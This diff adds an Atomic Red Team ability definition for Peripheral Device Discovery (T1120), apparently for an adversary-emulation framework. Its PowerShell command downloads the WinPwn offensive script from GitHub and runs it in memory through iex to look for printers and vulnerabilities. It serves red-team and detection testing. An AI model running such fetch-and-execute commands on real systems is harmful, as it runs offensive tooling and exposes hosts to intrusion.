@@ -1,0 +1,27 @@
+- id: cb6e76ca-861e-4a7f-be08-564caa3e6f75
+  name: WinPwn - printercheck
+  description: Search for printers / potential vulns using printercheck function of
+    WinPwn
+  tactic: discovery
+  technique:
+    attack_id: T1120
+    name: Peripheral Device Discovery
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          printercheck -noninteractive -consoleoutput
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1120
+  - discovery
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2017-05-31T21:31:28.471Z'
+    atomic_guid: cb6e76ca-861e-4a7f-be08-564caa3e6f75
+    import_timestamp: '2025-06-24T11:15:07.241670Z'
